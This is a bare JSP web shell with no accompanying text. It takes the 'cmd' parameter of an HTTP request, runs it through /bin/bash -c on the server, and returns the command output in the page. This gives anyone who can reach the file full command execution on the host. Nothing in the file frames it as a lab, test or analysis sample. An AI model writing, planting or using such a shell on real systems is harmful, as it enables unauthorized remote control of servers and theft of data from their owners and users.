<%@ page import="java.util.*,java.io.*"%>
<%
if(request.getParameter("cmd")!=null){
  Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});
  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; StringBuilder sb=new StringBuilder();
  while((line=br.readLine())!=null) sb.append(line+"\n");
  p.waitFor();
  out.println("<pre>"+sb.toString()+"</pre>");
}
%>
